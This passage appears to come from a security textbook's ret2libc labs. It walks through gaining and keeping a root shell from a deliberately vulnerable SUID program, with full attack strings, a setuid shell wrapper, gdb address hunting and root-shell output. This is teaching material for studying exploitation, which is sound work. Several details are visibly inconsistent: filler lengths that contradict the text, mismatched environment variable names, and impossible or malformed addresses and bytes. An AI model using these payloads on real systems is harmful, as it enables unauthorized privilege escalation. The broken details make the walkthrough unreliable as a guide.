
$ ./vuln2 `perl -e 'print "A"x15 . "\x30\x7b\xe3\xb7\xBBBB\x28\x9d\xf5\xb7"'`
# id
uid=1000(joeuser) gid=1000(joeuser) euid=0(root) groups=1000(joeuser)
# exit
Segmentation fault

Notice that we got a shell that is EUID root, and when we exited from the shell, we got a segmentation fault. Why did this happen? The program crashed when we left the user-level shell because the filler we supplied (0x42424242) became the saved EIP to be executed after the system() function. So, a crash was the expected behavior when the program ended. To avoid that crash, we can simply supply the pointer to the exit() function in that filler location:

```
$ ./vuln2 `perl -e 'print "A"x15 . "\x30\x7b\xe3\xb7\xe0\xb7\xe2\xb7\x28\x9d\xf5\xb7"'`
# id
uid=1000(joeuser) gid=1000(joeuser) euid=0(root) groups=1000(joeuser)
# exit
```

Congratulations, we now have a shell with the effective UID (EUID) of root.

Using “return to libc” (ret2libc), we have the ability to direct application flow to other parts of the binary. By loading the stack with return paths and options to functions, when we overwrite EIP, we can direct the application flow to other parts of the application. Because we’ve loaded the stack with valid return locations and data locations, the application won’t know it has been diverted, allowing us to leverage these techniques to launch our shell.

## Lab 12-6: Maintaining Privileges with ret2libc

In some cases, we may end up without root privileges. This is because the default behavior of system and bash on some systems is to drop privileges on startup. The bash installed in Kali does not do this; however, in Red Hat and others, it does.

For this lab, we will be using Kali Rolling. To get around the privilege dropping, we need to use a wrapper program that contains the system function call. Then, we can call the wrapper program with the execl() function, which does not drop privileges. The wrapper looks like this:

```
# cat wrapper.c
int main(){
        setuid(0);
        setgid(0);
        system("/bin/sh");
}
```

```
# gcc -o wrapper wrapper.c
```

Notice that we do not need the wrapper program to be SUID.

Next, we’ll call the wrapper with the execl() function, like this:

```
execl("./wrapper", "./wrapper", NULL)
```

We now have another issue to work through: the execl() function contains a NULL value as the last argument. We will deal with that in a moment. First, let’s test the execl() function call with a simple test program and ensure that it does not drop privileges when run as root:

```
# cat test_execl.c
int main(){
    execl("./wrapper", "./wrapper", 0 );
}
```

Compile and make SUID like the vulnerable program vuln2.c:

```
# gcc -o test_execl test_execl.c
# chown root.root test_execl
# chmod u+s test_execl
# ls -l test_execl
-rwsr-xr-x 1 root root 7460 Jul  3 02:24 test_execl

# su joeuser
$
```

Run it to test the functionality:

```
$ ./test_execl
# id
uid=0(root) gid=0(root) groups=0(root),1000(joeuser)
# exit
```

Great, we now have a way to keep the root privileges. Now all we need is a way to produce a NULL byte on the stack. There are several ways to do this; however, for illustrative purposes, we will use the printf() function as a wrapper around the execl() function. Recall that the %hn format token can be used to write into memory locations. To make this happen, we need to chain together more than one libc function call, as shown here:

![](img/5f597c6a70133069118d9e804ace3775_322_0.png)

Just like we did before, we will overwrite the old saved EIP with the address of the glibc printf() function. At that point, when the original vulnerable function returns, this new saved EIP will be popped off the stack and printf() will be executed with the arguments starting with %6\$n, which will write the number of bytes in the format string up to the format token (0x0000) into the third direct parameter. Because the third parameter contains its own location, the value of 0x00000 will be written into that spot. Next, the execl() function is called with the arguments from the first ./wrapper string onward. Voilà, we have created the desired execl() function on the fly with this self-modifying buffer attack string.

In order to build the preceding exploit, we need the following information:

- The address of the printf() function
- The address of the execl() function
- The address of the %6\$n string in memory (we will use the environment section)
- The address of the ./wrapper string in memory (we will use the environment section)
- The address of the location we want to overwrite with a NULL value

Starting at the top, let's get the addresses:

```
$ gdb -q vuln2
Reading symbols from vuln2...done.
(gdb) b main
Breakpoint 1 at 0x5b1: file vuln2.c, line 5.
(gdb) r
Starting program: /root/ch12/vuln2

Breakpoint 1, main (argc=1, argv=0xbffff764) at vuln2.c:5
5           strcpy(buffer, argv[1]);
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7e46930 <__printf>
(gdb) p execl
$2 = {<text variable, no debug info>} 0xb7eae750 <__GI_execl>
(gdb) q
A debugging session is active.

Inferior 1 [process 14355] will be killed.

Quit anyway? (y or n) y
```

We will use the environment section of memory to store our strings and retrieve their location with our handy getenv utility. Remember that the getenv program needs to be the same size as the vulnerable program—in this case, vuln2 (five characters):

```
$ cp getenv gtenv
```

Okay, we are ready to place the strings into memory and retrieve their locations:

```
$ export FMTS="%6\$n"  #escape the $ with a backslash
$ echo $FMTS
%6$n
$ ./getenv FMTSTR
FMTSTR is located at 0xbfffff16
```

```
$ export WRAPPER="./wrapper"
$ echo $WRAPPER
./wrapper
$ ./getenv WRAPPER
WRAPPER is located at 0xbfffff23
```

We have everything except the location of the last memory slot of our buffer. To determine this value, first we find the size of the vulnerable buffer. With this simple program, we have only one internal buffer, which will be located at the top of the stack when inside the vulnerable function main(). In the real world, a little more research will be required to find the location of the vulnerable buffer by looking at the disassembly and using some trial and error.

```
$ gdb -q vuln2
Reading symbols from vuln2...done.
(gdb) b main
Breakpoint 1 at 0x5b1: file vuln2.c, line 5.
(gdb) r
Starting program: /root/ch12/vuln2

Breakpoint 1, main (argc=1, argv=0xbffff754) at vuln2.c:5
5           strcpy(buffer, argv[1]);
(gdb) disas main
Dump of assembler code for function main:
0x800005a0 <+0>:    push   %ebp
0x800005a1 <+1>:    mov    %esp,%ebp
0x800005a3 <+3>:    push   %ebx
0x800005a4 <+4>:    sub    $0x8,%esp
<truncated for brevity>
```

Now that we know the size of the vulnerable buffer,(8) we can calculate the location of the sixth memory address by adding 8 + 6 * 4 = 32 = 0x20. Because we will place 4 bytes in that last location, the total size of the attack buffer is 36 bytes.

Next, we send a representative-size (52 bytes) buffer into our vulnerable program and find the location of the beginning of the vulnerable buffer with gdb by printing the value of $esp:

```
(gdb) r `perl -e 'print "A"x52`' 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/ch12/vuln2 `perl -e 'print "A"x52`'
Breakpoint 1, main (argc=2, argv=0xbffffff714) at vuln2.c:5
5         strcpy(buffer, argv[1]);
(gdb) p $esp
$1 = (void *) 0xbffffff66c
```

Now that we have the location of the beginning of the buffer, add the calculated offset from earlier to get the correct target location (sixth memory slot after our overflowed buffer):

```
0xbffffff66c + 0x20 = 0xbffffff68c
```

Finally, we have all the data we need, so let’s attack!

```
./vuln2 `perl -e 'print "A"x15 . "\x30\x69\xe4\xb7\x50\xe7\xea\xb7\x16\xff\
xff\xbf\x23\xff\xff\xbf\x23\xff\xff\
\xbf\x8c\xef\x6\xff\xbf"'`
# id
uid=0(root) gid=0(root) groups=0(root),1000(joeuser)
# exit
```

Woot! It worked. You may have realized that a shortcut exists here. If you look at the last illustration, you will notice the last value of the attack string is a NULL. Occasionally, you will run into this situation. In that rare case, you won’t care if you pass a NULL byte into the vulnerable program because the string will terminate by a NULL anyway. Therefore, in this canned scenario, you could have removed the printf() function and simply fed the execl() attack string, as follows:

```
./vuln2 [filler of 28 bytes] [&execl] [&exit] [./wrapper] [./wrapper]
```

Try it:

```
$ ./vuln2 `perl -e 'print "A"x15 . "\x50\xe7\xea\xb7\xe0\xb7\xe2\xb7\x23\xff\
xff\xbf\x23\xff\xff\xbf"'`
# id
uid=0(root) gid=0(root) groups=0(root),1000(joeuser)
# exit
```

Both ways work in this case. You will not always be as lucky, so you need to know both ways. See the “For Further Reading” section for even more creative ways to return to libc.

When privileges are being dropped, we can leverage other function calls to work around the calls that are dropping privileges. In this case, we leveraged the printf memory overwrite capability to null-terminate the options to execl. By chaining these function calls using ret2libc, we don’t have to worry about putting executable code on the stack, and we can use complex options to functions we’ve pushed onto the stack.

## Bottom Line
